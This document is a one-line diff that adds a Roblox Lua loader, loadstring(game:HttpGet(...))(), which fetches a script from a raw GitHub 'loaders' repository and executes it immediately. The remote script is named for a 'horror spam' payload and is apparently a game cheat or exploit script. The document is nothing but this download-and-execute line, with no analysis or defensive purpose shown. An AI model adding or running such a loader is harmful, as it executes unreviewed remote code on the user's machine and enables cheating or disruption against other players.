@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/it-wants-in-horror-spam5-wszcy22eigm72a.lua"))()
